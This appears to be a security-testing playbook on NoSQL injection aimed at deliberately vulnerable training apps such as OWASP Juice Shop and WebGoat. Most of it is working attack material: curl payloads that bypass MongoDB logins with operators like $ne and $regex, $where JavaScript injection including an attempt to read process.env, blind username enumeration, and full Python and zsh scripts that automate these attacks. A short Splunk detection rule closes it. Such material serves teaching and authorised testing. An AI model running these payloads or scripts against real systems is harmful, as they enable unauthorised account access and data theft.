# Playbook 12: NoSQL Injection Attacks

## Overview

This playbook covers comprehensive NoSQL injection testing targeting MongoDB, CouchDB, and other NoSQL databases. It includes authentication bypass, query injection, JavaScript injection, and operator injection techniques across OWASP Juice Shop, DVWA, XVWA, and WebGoat.

## Target Applications

- **OWASP Juice Shop**: MongoDB backend authentication and product queries
- **DVWA**: Custom NoSQL implementations
- **XVWA**: NoSQL database interactions
- **WebGoat**: NoSQL injection lessons and challenges

## Prerequisites

```bash
# Install required tools
pip3 install pymongo requests beautifulsoup4 urllib3
npm install -g nosql-injection-cli
brew install mongodb-community  # For testing MongoDB

# Clone NoSQL injection wordlists
git clone https://github.com/cr0hn/nosqlinjection_wordlists.git ~/nosql-wordlists
```

## Manual Testing Commands

### 1. MongoDB Authentication Bypass

```bash
# Basic NoSQL injection - authentication bypass
curl -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email": {"$ne": null}, "password": {"$ne": null}}'

# OR operator injection
curl -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email": {"$or": [{"email": "admin"}, {"email": "user"}]}, "password": {"$ne": null}}'

# Regex injection for username enumeration
curl -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email": {"$regex": "^admin.*"}, "password": {"$ne": null}}'
```

### 2. Query Parameter Injection

```bash
# URL parameter NoSQL injection
curl "http://localhost:3000/api/users?id[\$ne]=null"
curl "http://localhost:3000/api/users?username[\$regex]=^admin"
curl "http://localhost:3000/api/products?category[\$nin][]=electronics&category[\$nin][]=books"

# Array injection
curl "http://localhost:3000/api/search?filters[\$where]=this.price < 100"
curl "http://localhost:3000/api/search?filters[\$exists]=true"
```

### 3. JavaScript Injection (MongoDB)

```bash
# Where clause injection
curl -X POST "http://localhost:3000/api/search" \
  -H "Content-Type: application/json" \
  -d '{"query": {"$where": "this.username == \"admin\" || \"1\" == \"1\""}}'

# Function injection
curl -X POST "http://localhost:3000/api/search" \
  -H "Content-Type: application/json" \
  -d '{"query": {"$where": "function() { return this.username == \"admin\" || true; }"}}'

# Sleep injection for time-based testing
curl -X POST "http://localhost:3000/api/search" \
  -H "Content-Type: application/json" \
  -d '{"query": {"$where": "sleep(5000) || true"}}'
```

### 4. Operator Injection Testing

```bash
# $gt (greater than) operator
curl "http://localhost:3000/api/products?price[\$gt]=0"

# $lt (less than) operator
curl "http://localhost:3000/api/products?price[\$lt]=9999"

# $in operator with array
curl "http://localhost:3000/api/users?role[\$in][]=admin&role[\$in][]=user"

# $all operator
curl "http://localhost:3000/api/products?tags[\$all][]=electronics&tags[\$all][]=featured"

# $size operator
curl "http://localhost:3000/api/products?reviews[\$size]=5"
```

## Automated Python Script

```python
#!/usr/bin/env python3
"""
NoSQL Injection Testing Framework
Comprehensive NoSQL injection testing for MongoDB and other NoSQL databases
"""

import requests
import json
import time
import re
import urllib.parse
import threading
from concurrent.futures import ThreadPoolExecutor
import logging

class NoSQLInjectionTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })
        self.results = []
        self.setup_logging()

    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('nosql_injection_results.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def test_mongodb_authentication_bypass(self, base_url="http://localhost:3000"):
        """Test MongoDB authentication bypass vulnerabilities"""
        self.logger.info("Testing MongoDB authentication bypass")

        login_url = f"{base_url}/rest/user/login"

        # NoSQL injection payloads for authentication bypass
        auth_bypass_payloads = [
            {"email": {"$ne": None}, "password": {"$ne": None}},
            {"email": {"$ne": ""}, "password": {"$ne": ""}},
            {"email": {"$gt": ""}, "password": {"$gt": ""}},
            {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"email": {"$exists": True}, "password": {"$exists": True}},
            {"email": {"$or": [{"email": "admin"}, {"email": "user"}]}, "password": {"$ne": None}},
            {"email": {"$where": "1==1"}, "password": {"$where": "1==1"}},
            {"email": {"$nin": [""]}, "password": {"$nin": [""]}},
            {"email": {"$not": {"$eq": ""}}, "password": {"$not": {"$eq": ""}}},
            {"email": {"$regex": "^admin.*", "$options": "i"}, "password": {"$ne": None}}
        ]

        for payload in auth_bypass_payloads:
            try:
                response = self.session.post(login_url, json=payload, timeout=10)

                if self.analyze_nosql_auth_response(response, payload):
                    self.results.append({
                        'url': login_url,
                        'payload': payload,
                        'type': 'auth_bypass',
                        'vulnerable': True,
                        'status_code': response.status_code,
                        'response_time': response.elapsed.total_seconds()
                    })
                    self.logger.warning(f"NoSQL auth bypass found: {payload}")

                time.sleep(0.5)  # Rate limiting

            except Exception as e:
                self.logger.error(f"Error testing auth bypass: {e}")

    def test_query_parameter_injection(self, base_url="http://localhost:3000"):
        """Test NoSQL injection in URL parameters"""
        self.logger.info("Testing NoSQL query parameter injection")

        test_endpoints = [
            "/api/users",
            "/api/products",
            "/rest/products/search",
            "/api/orders",
            "/api/search"
        ]

        # NoSQL operator injection payloads
        operator_payloads = [
            {"param": "id", "payload": {"$ne": None}},
            {"param": "username", "payload": {"$regex": "^admin"}},
            {"param": "price", "payload": {"$gt": 0}},
            {"param": "price", "payload": {"$lt": 9999}},
            {"param": "category", "payload": {"$in": ["electronics", "books"]}},
            {"param": "status", "payload": {"$nin": ["deleted"]}},
            {"param": "tags", "payload": {"$all": ["featured"]}},
            {"param": "created", "payload": {"$exists": True}},
            {"param": "reviews", "payload": {"$size": 5}},
            {"param": "data", "payload": {"$where": "this.id > 0"}}
        ]

        for endpoint in test_endpoints:
            url = f"{base_url}{endpoint}"

            for payload_data in operator_payloads:
                try:
                    # Test with different parameter encoding methods
                    params = self.encode_nosql_payload(payload_data["param"], payload_data["payload"])

                    response = self.session.get(url, params=params, timeout=10)

                    if self.analyze_nosql_query_response(response, payload_data):
                        self.results.append({
                            'url': url,
                            'payload': payload_data,
                            'type': 'query_injection',
                            'vulnerable': True,
                            'status_code': response.status_code,
                            'response_time': response.elapsed.total_seconds()
                        })
                        self.logger.warning(f"NoSQL query injection found: {endpoint} - {payload_data}")

                    time.sleep(0.5)

                except Exception as e:
                    self.logger.error(f"Error testing query injection: {e}")

    def test_javascript_injection(self, base_url="http://localhost:3000"):
        """Test JavaScript injection in NoSQL where clauses"""
        self.logger.info("Testing JavaScript injection in NoSQL queries")

        search_url = f"{base_url}/api/search"

        # JavaScript injection payloads
        js_payloads = [
            {"$where": "this.username == 'admin' || '1' == '1'"},
            {"$where": "function() { return this.price > 0 || true; }"},
            {"$where": "this.id > 0 || true"},
            {"$where": "sleep(5000) || true"},  # Time-based
            {"$where": "this.username.match(/admin/)"},
            {"$where": "Object.keys(this).length > 0"},
            {"$where": "this.constructor.constructor('return process.env')()"},  # Code execution attempt
            {"$where": "this.password.length > 0 || true"},
            {"$where": "JSON.stringify(this).indexOf('admin') >= 0"},
            {"$where": "eval('1+1') == 2"}
        ]

        for payload in js_payloads:
            try:
                # Test as POST JSON
                data = {"query": payload}
                response = self.session.post(search_url, json=data, timeout=15)

                if self.analyze_js_injection_response(response, payload):
                    self.results.append({
                        'url': search_url,
                        'payload': payload,
                        'type': 'javascript_injection',
                        'vulnerable': True,
                        'status_code': response.status_code,
                        'response_time': response.elapsed.total_seconds()
                    })
                    self.logger.warning(f"JavaScript injection found: {payload}")

                # Test as URL parameter
                params = {"where": json.dumps(payload)}
                response = self.session.get(search_url, params=params, timeout=15)

                if self.analyze_js_injection_response(response, payload):
                    self.results.append({
                        'url': search_url,
                        'payload': payload,
                        'type': 'javascript_injection_param',
                        'vulnerable': True,
                        'status_code': response.status_code,
                        'response_time': response.elapsed.total_seconds()
                    })

                time.sleep(1)  # Longer delay for JS injection

            except Exception as e:
                self.logger.error(f"Error testing JavaScript injection: {e}")

    def test_blind_nosql_injection(self, base_url="http://localhost:3000"):
        """Test blind NoSQL injection techniques"""
        self.logger.info("Testing blind NoSQL injection")

        login_url = f"{base_url}/rest/user/login"

        # Character-by-character username enumeration
        known_users = ["admin", "user", "test", "guest"]

        for username in known_users:
            self.logger.info(f"Testing blind injection for username: {username}")

            # Test each character position
            for i in range(len(username)):
                char = username[i]

                # Create regex pattern to match up to current character
                pattern = "^" + username[:i+1]

                payload = {
                    "email": {"$regex": pattern},
                    "password": {"$ne": None}
                }

                try:
                    response = self.session.post(login_url, json=payload, timeout=10)

                    # Check if response indicates valid username prefix
                    if response.status_code == 401:  # Unauthorized but user exists
                        self.logger.info(f"Valid username prefix found: {username[:i+1]}")
                    elif response.status_code == 200:  # Successful login bypass
                        self.results.append({
                            'url': login_url,
                            'payload': payload,
                            'type': 'blind_injection',
                            'vulnerable': True,
                            'discovered_username': username[:i+1]
                        })

                    time.sleep(0.2)

                except Exception as e:
                    self.logger.error(f"Error in blind injection test: {e}")

    def test_time_based_nosql_injection(self, base_url="http://localhost:3000"):
        """Test time-based blind NoSQL injection"""
        self.logger.info("Testing time-based NoSQL injection")

        search_url = f"{base_url}/api/search"

        # Time-based payloads
        time_payloads = [
            {"$where": "sleep(5000) || true"},
            {"$where": "this.id > 0 && sleep(5000)"},
            {"$where": "function() { var start = new Date(); while (new Date() - start < 5000); return true; }"},
            {"$where": "Date.now() + 5000 < Date.now() + 10000"},  # Logic to cause delay
        ]

        for payload in time_payloads:
            try:
                start_time = time.time()

                data = {"query": payload}
                response = self.session.post(search_url, json=data, timeout=15)

                end_time = time.time()
                response_time = end_time - start_time

                if response_time >= 4:  # Allow some tolerance
                    self.logger.warning(f"Time-based NoSQL injection detected! Response time: {response_time:.2f}s")
                    self.results.append({
                        'url': search_url,
                        'payload': payload,
                        'type': 'time_based_injection',
                        'vulnerable': True,
                        'response_time': response_time
                    })

                time.sleep(1)

            except requests.exceptions.Timeout:
                self.logger.warning("Request timeout - possible time-based injection")
            except Exception as e:
                self.logger.error(f"Error in time-based test: {e}")

    def encode_nosql_payload(self, param_name, payload):
        """Encode NoSQL operator payloads for URL parameters"""
        params = {}

        if isinstance(payload, dict):
            for operator, value in payload.items():
                if isinstance(value, list):
                    for i, item in enumerate(value):
                        params[f"{param_name}[{operator}][{i}]"] = item
                else:
                    params[f"{param_name}[{operator}]"] = value
        else:
            params[param_name] = payload

        return params

    def analyze_nosql_auth_response(self, response, payload):
        """Analyze authentication response for NoSQL injection indicators"""
        # Check for successful authentication bypass
        if response.status_code == 200:
            response_text = response.text.lower()

            # Look for authentication success indicators
            success_indicators = [
                "token",
                "authentication successful",
                "login successful",
                "welcome",
                "dashboard",
                "profile"
            ]

            for indicator in success_indicators:
                if indicator in response_text:
                    return True

        # Check for error messages that indicate injection worked
        error_indicators = [
            "invalid operator",
            "mongodb error",
            "nosql",
            "bson",
            "objectid"
        ]

        response_text = response.text.lower()
        for error in error_indicators:
            if error in response_text:
                return True

        return False

    def analyze_nosql_query_response(self, response, payload_data):
        """Analyze query response for NoSQL injection indicators"""
        # Check for successful data retrieval
        if response.status_code == 200:
            try:
                json_response = response.json()

                # Check if response contains data (successful injection)
                if isinstance(json_response, dict) and json_response.get('data'):
                    return True
                elif isinstance(json_response, list) and len(json_response) > 0:
                    return True
            except json.JSONDecodeError:
                pass

        # Check for NoSQL-specific error messages
        return self.check_nosql_errors(response)

    def analyze_js_injection_response(self, response, payload):
        """Analyze JavaScript injection response"""
        # Check for successful execution or errors
        if response.status_code == 200:
            try:
                json_response = response.json()
                if json_response:  # Any data returned might indicate successful injection
                    return True
            except json.JSONDecodeError:
                pass

        # Check response time for time-based payloads
        if "sleep" in str(payload) and response.elapsed.total_seconds() >= 4:
            return True

        return self.check_nosql_errors(response)

    def check_nosql_errors(self, response):
        """Check for NoSQL-specific error messages"""
        error_patterns = [
            r"mongodb.*error",
            r"invalid.*operator",
            r"bson.*error",
            r"nosql.*error",
            r"invalid.*regex",
            r"where.*function",
            r"eval.*error",
            r"javascript.*error"
        ]

        response_text = response.text.lower()

        for pattern in error_patterns:
            if re.search(pattern, response_text):
                return True

        return False

    def test_couchdb_injection(self, base_url="http://localhost:5984"):
        """Test CouchDB-specific injection techniques"""
        self.logger.info("Testing CouchDB injection techniques")

        # CouchDB view injection
        view_payloads = [
            {"key": {"$gt": None}},
            {"startkey": "\"", "endkey": "{}"},
            {"key": ["admin", {}]},
        ]

        # Test common CouchDB endpoints
        endpoints = [
            "/_all_dbs",
            "/_users/_all_docs",
            "/mydb/_all_docs",
        ]

        for endpoint in endpoints:
            url = f"{base_url}{endpoint}"

            for payload in view_payloads:
                try:
                    response = self.session.get(url, params=payload, timeout=10)

                    if response.status_code == 200:
                        self.logger.info(f"CouchDB endpoint accessible: {url}")
                        self.results.append({
                            'url': url,
                            'payload': payload,
                            'type': 'couchdb_injection',
                            'vulnerable': True,
                            'status_code': response.status_code
                        })

                    time.sleep(0.5)

                except Exception as e:
                    self.logger.error(f"Error testing CouchDB: {e}")

    def generate_report(self):
        """Generate comprehensive test report"""
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_tests': len(self.results),
            'vulnerabilities_found': len([r for r in self.results if r.get('vulnerable')]),
            'vulnerability_types': {},
            'results': self.results
        }

        # Count vulnerability types
        for result in self.results:
            if result.get('vulnerable'):
                vuln_type = result.get('type', 'unknown')
                report['vulnerability_types'][vuln_type] = report['vulnerability_types'].get(vuln_type, 0) + 1

        # Save JSON report
        with open('nosql_injection_report.json', 'w') as f:
            json.dump(report, f, indent=2)

        # Generate HTML report
        html_report = self.generate_html_report(report)
        with open('nosql_injection_report.html', 'w') as f:
            f.write(html_report)

        self.logger.info(f"Report generated: {report['vulnerabilities_found']} vulnerabilities found")
        return report

    def generate_html_report(self, report):
        """Generate HTML vulnerability report"""
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>NoSQL Injection Test Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background-color: #ff5722; color: white; padding: 10px; }}
                .summary {{ background-color: #f0f0f0; padding: 10px; margin: 10px 0; }}
                .vulnerability {{ background-color: #ffebee; border-left: 4px solid #f44336; padding: 10px; margin: 10px 0; }}
                .safe {{ background-color: #e8f5e8; border-left: 4px solid #4caf50; padding: 10px; margin: 10px 0; }}
                .payload {{ background-color: #f5f5f5; padding: 8px; margin: 5px 0; font-family: monospace; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>NoSQL Injection Security Assessment Report</h1>
                <p>Generated: {report['timestamp']}</p>
            </div>

            <div class="summary">
                <h2>Executive Summary</h2>
                <p><strong>Total Tests:</strong> {report['total_tests']}</p>
                <p><strong>Vulnerabilities Found:</strong> {report['vulnerabilities_found']}</p>
                <p><strong>Risk Level:</strong> {'HIGH' if report['vulnerabilities_found'] > 0 else 'LOW'}</p>

                <h3>Vulnerability Types</h3>
                <table>
                    <tr><th>Type</th><th>Count</th></tr>
        """

        for vuln_type, count in report['vulnerability_types'].items():
            html += f"<tr><td>{vuln_type.replace('_', ' ').title()}</td><td>{count}</td></tr>"

        html += """
                </table>
            </div>
        """

        for result in report['results']:
            if result.get('vulnerable'):
                html += f"""
                <div class="vulnerability">
                    <h3>NoSQL Injection Vulnerability - {result['type'].replace('_', ' ').title()}</h3>
                    <p><strong>URL:</strong> {result['url']}</p>
                    <p><strong>Method:</strong> {result.get('method', 'POST')}</p>
                    <div class="payload">
                        <strong>Payload:</strong><br>
                        <pre>{json.dumps(result['payload'], indent=2)}</pre>
                    </div>
                    <p><strong>Response Time:</strong> {result.get('response_time', 'N/A')}s</p>
                    <p><strong>Status Code:</strong> {result.get('status_code', 'N/A')}</p>
                </div>
                """

        html += """
        </body>
        </html>
        """

        return html

def main():
    tester = NoSQLInjectionTester()

    # Test various NoSQL injection techniques
    tester.test_mongodb_authentication_bypass()
    tester.test_query_parameter_injection()
    tester.test_javascript_injection()
    tester.test_blind_nosql_injection()
    tester.test_time_based_nosql_injection()

    # Test CouchDB if available
    # tester.test_couchdb_injection()

    # Generate final report
    report = tester.generate_report()

    print(f"\n{'='*60}")
    print("NOSQL INJECTION TEST COMPLETE")
    print(f"{'='*60}")
    print(f"Total vulnerabilities found: {report['vulnerabilities_found']}")
    print("\nVulnerability breakdown:")
    for vuln_type, count in report['vulnerability_types'].items():
        print(f"- {vuln_type.replace('_', ' ').title()}: {count}")
    print("\nReports saved:")
    print("- nosql_injection_report.json")
    print("- nosql_injection_report.html")
    print("- nosql_injection_results.log")

if __name__ == "__main__":
    main()
```

## Shell Script Automation

```bash
#!/bin/zsh
# NoSQL Injection Testing Automation Script
# Comprehensive testing for MongoDB and other NoSQL databases

set -e

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
JUICE_SHOP_URL="http://localhost:3000"
DVWA_URL="http://localhost/dvwa"
WEBGOAT_URL="http://localhost:8080/WebGoat"
COUCHDB_URL="http://localhost:5984"

# Results directory
RESULTS_DIR="nosql_injection_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$RESULTS_DIR"

echo -e "${BLUE}Starting NoSQL Injection Testing Suite${NC}"
echo "Results will be saved to: $RESULTS_DIR"

# Function to test MongoDB authentication bypass
test_mongodb_auth_bypass() {
    local login_url=$1

    echo -e "${YELLOW}Testing MongoDB authentication bypass${NC}"

    # Authentication bypass payloads
    local payloads=(
        '{"email": {"$ne": null}, "password": {"$ne": null}}'
        '{"email": {"$ne": ""}, "password": {"$ne": ""}}'
        '{"email": {"$gt": ""}, "password": {"$gt": ""}}'
        '{"email": {"$regex": ".*"}, "password": {"$regex": ".*"}}'
        '{"email": {"$exists": true}, "password": {"$exists": true}}'
        '{"email": {"$where": "1==1"}, "password": {"$where": "1==1"}}'
        '{"email": {"$nin": [""]}, "password": {"$nin": [""]}}'
    )

    for payload in "${payloads[@]}"; do
        echo "Testing payload: $payload"

        response=$(curl -s -w "%{http_code}" -X POST "$login_url" \
            -H "Content-Type: application/json" \
            -d "$payload" \
            -o "$RESULTS_DIR/auth_response_$(date +%s).json")

        if [[ "$response" == "200" ]]; then
            # Check if response contains authentication success indicators
            if grep -qi -E "(token|welcome|dashboard|authentication.*success)" \
               "$RESULTS_DIR/auth_response_$(date +%s).json" 2>/dev/null; then
                echo -e "${RED}[VULNERABLE] Authentication bypass successful!${NC}"
                echo "$login_url - Auth bypass: $payload" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
            fi
        elif [[ "$response" == "500" ]]; then
            echo -e "${YELLOW}[POTENTIAL] Server error - possible injection${NC}"
            echo "$login_url - Server error: $payload" >> "$RESULTS_DIR/potential_vulnerabilities.txt"
        else
            echo -e "${GREEN}[SAFE] No bypass detected (HTTP $response)${NC}"
        fi

        sleep 0.5
    done
}

# Function to test NoSQL operator injection
test_nosql_operators() {
    local base_url=$1

    echo -e "${YELLOW}Testing NoSQL operator injection${NC}"

    # Test endpoints
    local endpoints=(
        "/api/users"
        "/api/products"
        "/rest/products/search"
        "/api/search"
    )

    # Operator payloads
    local operators=(
        "id[\$ne]=null"
        "username[\$regex]=^admin"
        "price[\$gt]=0"
        "price[\$lt]=9999"
        "category[\$in][]=electronics"
        "status[\$nin][]=deleted"
        "created[\$exists]=true"
        "reviews[\$size]=5"
    )

    for endpoint in "${endpoints[@]}"; do
        local url="$base_url$endpoint"

        # Check if endpoint exists
        if ! curl -s "$url" > /dev/null 2>&1; then
            continue
        fi

        echo "Testing endpoint: $endpoint"

        for operator in "${operators[@]}"; do
            echo "  Testing operator: $operator"

            response=$(curl -s -w "%{http_code}" "$url?$operator" \
                -o "$RESULTS_DIR/operator_response_$(echo $operator | tr '[]$/' '_').json")

            if [[ "$response" == "200" ]]; then
                # Check if response contains data indicating successful injection
                if grep -qi -E '(\[.*\]|\{.*".*":)' \
                   "$RESULTS_DIR/operator_response_$(echo $operator | tr '[]$/' '_').json" 2>/dev/null; then
                    echo -e "${RED}[VULNERABLE] Operator injection successful!${NC}"
                    echo "$url - Operator: $operator" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
                fi
            elif [[ "$response" == "500" ]]; then
                echo -e "${YELLOW}[POTENTIAL] Server error with operator${NC}"
                echo "$url - Error with: $operator" >> "$RESULTS_DIR/potential_vulnerabilities.txt"
            fi

            sleep 0.3
        done
    done
}

# Function to test JavaScript injection
test_javascript_injection() {
    local search_url=$1

    echo -e "${YELLOW}Testing JavaScript injection in NoSQL queries${NC}"

    # JavaScript injection payloads
    local js_payloads=(
        '{"query": {"$where": "this.username == \"admin\" || \"1\" == \"1\""}}'
        '{"query": {"$where": "function() { return this.price > 0 || true; }"}}'
        '{"query": {"$where": "this.id > 0 || true"}}'
        '{"query": {"$where": "this.username.match(/admin/)"}}'
        '{"query": {"$where": "Object.keys(this).length > 0"}}'
        '{"query": {"$where": "JSON.stringify(this).indexOf(\"admin\") >= 0"}}'
    )

    for payload in "${js_payloads[@]}"; do
        echo "Testing JS payload: $payload"

        response=$(curl -s -w "%{http_code}" -X POST "$search_url" \
            -H "Content-Type: application/json" \
            -d "$payload" \
            -o "$RESULTS_DIR/js_response_$(date +%s).json")

        if [[ "$response" == "200" ]]; then
            # Check if response contains data
            if grep -qi -E '(\[.*\]|\{.*".*":)' \
               "$RESULTS_DIR/js_response_$(date +%s).json" 2>/dev/null; then
                echo -e "${RED}[VULNERABLE] JavaScript injection successful!${NC}"
                echo "$search_url - JS injection: $payload" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
            fi
        elif [[ "$response" == "500" ]]; then
            echo -e "${YELLOW}[POTENTIAL] Server error - possible JS injection${NC}"
            echo "$search_url - JS error: $payload" >> "$RESULTS_DIR/potential_vulnerabilities.txt"
        fi

        sleep 0.5
    done
}

# Function to test time-based NoSQL injection
test_time_based_injection() {
    local search_url=$1

    echo -e "${YELLOW}Testing time-based NoSQL injection${NC}"

    # Time-based payloads
    local time_payloads=(
        '{"query": {"$where": "sleep(5000) || true"}}'
        '{"query": {"$where": "function() { var start = new Date(); while (new Date() - start < 5000); return true; }"}}'
    )

    for payload in "${time_payloads[@]}"; do
        echo "Testing time-based payload: $payload"

        start_time=$(date +%s)

        response=$(curl -s -w "%{http_code}" -X POST "$search_url" \
            -H "Content-Type: application/json" \
            -d "$payload" \
            -m 10 \
            -o "$RESULTS_DIR/time_response_$(date +%s).json")

        end_time=$(date +%s)
        duration=$((end_time - start_time))

        if [[ $duration -ge 4 ]]; then
            echo -e "${RED}[VULNERABLE] Time-based injection detected! Response time: ${duration}s${NC}"
            echo "$search_url - Time-based injection: $payload" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
        else
            echo -e "${GREEN}[SAFE] Normal response time: ${duration}s${NC}"
        fi

        sleep 1
    done
}

# Function to test blind NoSQL injection
test_blind_injection() {
    local login_url=$1

    echo -e "${YELLOW}Testing blind NoSQL injection for username enumeration${NC}"

    # Common usernames to test
    local usernames=("admin" "user" "test" "guest" "root")

    for username in "${usernames[@]}"; do
        echo "Testing username: $username"

        # Test if username exists using regex
        local regex_payload="{\"email\": {\"\\$regex\": \"^$username\"}, \"password\": {\"\\$ne\": null}}"

        response=$(curl -s -w "%{http_code}" -X POST "$login_url" \
            -H "Content-Type: application/json" \
            -d "$regex_payload" \
            -o "$RESULTS_DIR/blind_response_$username.json")

        if [[ "$response" == "401" ]]; then
            echo -e "${YELLOW}[INFO] Username '$username' exists (unauthorized)${NC}"
            echo "$login_url - Valid username: $username" >> "$RESULTS_DIR/discovered_usernames.txt"
        elif [[ "$response" == "200" ]]; then
            echo -e "${RED}[VULNERABLE] Authentication bypass for username: $username${NC}"
            echo "$login_url - Auth bypass username: $username" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
        fi

        sleep 0.5
    done
}

# Function to test CouchDB injection
test_couchdb_injection() {
    local couchdb_url=$1

    echo -e "${YELLOW}Testing CouchDB injection techniques${NC}"

    # CouchDB endpoints to test
    local endpoints=(
        "/_all_dbs"
        "/_users/_all_docs"
        "/_config"
        "/_stats"
    )

    for endpoint in "${endpoints[@]}"; do
        local url="$couchdb_url$endpoint"

        echo "Testing CouchDB endpoint: $endpoint"

        response=$(curl -s -w "%{http_code}" "$url" \
            -o "$RESULTS_DIR/couchdb_response_$(echo $endpoint | tr '/' '_').json")

        if [[ "$response" == "200" ]]; then
            echo -e "${RED}[ACCESSIBLE] CouchDB endpoint accessible: $endpoint${NC}"
            echo "$url - Accessible CouchDB endpoint" >> "$RESULTS_DIR/accessible_endpoints.txt"
        elif [[ "$response" == "401" ]]; then
            echo -e "${YELLOW}[INFO] CouchDB endpoint requires authentication: $endpoint${NC}"
        else
            echo -e "${GREEN}[SAFE] CouchDB endpoint not accessible: $endpoint (HTTP $response)${NC}"
        fi

        sleep 0.3
    done

    # Test CouchDB view injection
    echo "Testing CouchDB view injection..."

    local view_payloads=(
        'startkey="\"&endkey="{}"'
        'key={"$gt":null}'
        'keys=["admin",{}]'
    )

    for payload in "${view_payloads[@]}"; do
        local url="$couchdb_url/_users/_all_docs?$payload"

        response=$(curl -s -w "%{http_code}" "$url" \
            -o "$RESULTS_DIR/couchdb_view_$(echo $payload | tr '{}[]"$' '_').json")

        if [[ "$response" == "200" ]]; then
            echo -e "${RED}[VULNERABLE] CouchDB view injection successful!${NC}"
            echo "$url - View injection: $payload" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
        fi

        sleep 0.5
    done
}

# Main testing function
main() {
    echo -e "${BLUE}NoSQL Injection Testing Suite Started${NC}"
    echo "Timestamp: $(date)"
    echo "Results directory: $RESULTS_DIR"

    # Test OWASP Juice Shop
    if curl -s "$JUICE_SHOP_URL" > /dev/null 2>&1; then
        echo -e "\n${BLUE}Testing OWASP Juice Shop${NC}"
        test_mongodb_auth_bypass "$JUICE_SHOP_URL/rest/user/login"
        test_nosql_operators "$JUICE_SHOP_URL"
        test_javascript_injection "$JUICE_SHOP_URL/api/search"
        test_time_based_injection "$JUICE_SHOP_URL/api/search"
        test_blind_injection "$JUICE_SHOP_URL/rest/user/login"
    else
        echo -e "${YELLOW}OWASP Juice Shop not accessible at $JUICE_SHOP_URL${NC}"
    fi

    # Test CouchDB if available
    if curl -s "$COUCHDB_URL" > /dev/null 2>&1; then
        echo -e "\n${BLUE}Testing CouchDB${NC}"
        test_couchdb_injection "$COUCHDB_URL"
    else
        echo -e "${YELLOW}CouchDB not accessible at $COUCHDB_URL${NC}"
    fi

    # Generate summary report
    echo -e "\n${BLUE}Generating Summary Report${NC}"

    if [[ -f "$RESULTS_DIR/vulnerable_endpoints.txt" ]]; then
        vulnerable_count=$(wc -l < "$RESULTS_DIR/vulnerable_endpoints.txt")
        echo -e "${RED}Vulnerable endpoints found: $vulnerable_count${NC}"
        echo "Vulnerable endpoints:"
        cat "$RESULTS_DIR/vulnerable_endpoints.txt"
    else
        echo -e "${GREEN}No confirmed NoSQL injection vulnerabilities found${NC}"
    fi

    if [[ -f "$RESULTS_DIR/potential_vulnerabilities.txt" ]]; then
        potential_count=$(wc -l < "$RESULTS_DIR/potential_vulnerabilities.txt")
        echo -e "${YELLOW}Potential vulnerabilities: $potential_count${NC}"
        echo "Potential vulnerabilities:"
        cat "$RESULTS_DIR/potential_vulnerabilities.txt"
    fi

    if [[ -f "$RESULTS_DIR/discovered_usernames.txt" ]]; then
        username_count=$(wc -l < "$RESULTS_DIR/discovered_usernames.txt")
        echo -e "${YELLOW}Discovered usernames: $username_count${NC}"
        echo "Discovered usernames:"
        cat "$RESULTS_DIR/discovered_usernames.txt"
    fi

    if [[ -f "$RESULTS_DIR/accessible_endpoints.txt" ]]; then
        accessible_count=$(wc -l < "$RESULTS_DIR/accessible_endpoints.txt")
        echo -e "${YELLOW}Accessible endpoints: $accessible_count${NC}"
        echo "Accessible endpoints:"
        cat "$RESULTS_DIR/accessible_endpoints.txt"
    fi

    echo -e "\n${BLUE}Testing complete. Results saved to: $RESULTS_DIR${NC}"
    echo "Key files:"
    echo "- vulnerable_endpoints.txt: Confirmed NoSQL injection vulnerabilities"
    echo "- potential_vulnerabilities.txt: Potential issues requiring manual review"
    echo "- discovered_usernames.txt: Valid usernames discovered through blind injection"
    echo "- accessible_endpoints.txt: Accessible database endpoints"
    echo "- *_response_*.json: HTTP response captures"
}

# Check dependencies
check_dependencies() {
    echo "Checking dependencies..."

    if ! command -v curl >/dev/null 2>&1; then
        echo -e "${RED}Error: curl is required but not installed${NC}"
        exit 1
    fi

    if ! command -v jq >/dev/null 2>&1; then
        echo -e "${YELLOW}Warning: jq not found. Install with: brew install jq${NC}"
    fi

    echo -e "${GREEN}Dependencies check complete${NC}"
}

# Cleanup function
cleanup() {
    echo -e "\n${YELLOW}Cleaning up temporary files...${NC}"
    # Remove any temporary files if needed
    echo -e "${GREEN}Cleanup complete${NC}"
}

# Set trap for cleanup
trap cleanup EXIT

# Run dependency check and main function
check_dependencies
main

echo -e "\n${GREEN}NoSQL injection testing suite completed successfully!${NC}"
```

## Detection and Monitoring

### SIEM Rules for NoSQL Injection Detection

```sql
-- Splunk Detection Rule for NoSQL Injection
index=web_logs
| regex _raw="(?i)(\$ne|\$gt|\$lt|\$regex|\$where|\$exists|\$in|\$nin|\$or|\$and)"
| eval nosql_injection_score=0
| eval nosql_injection_score=if(match(_raw,"(?i)\$ne"),nosql_injection_score+2,nosql_injection_score)
| eval nosql_injection_score=if(match(_raw,"(?i)\$regex"),nosql_injection_score+3,nosql_injection_score)
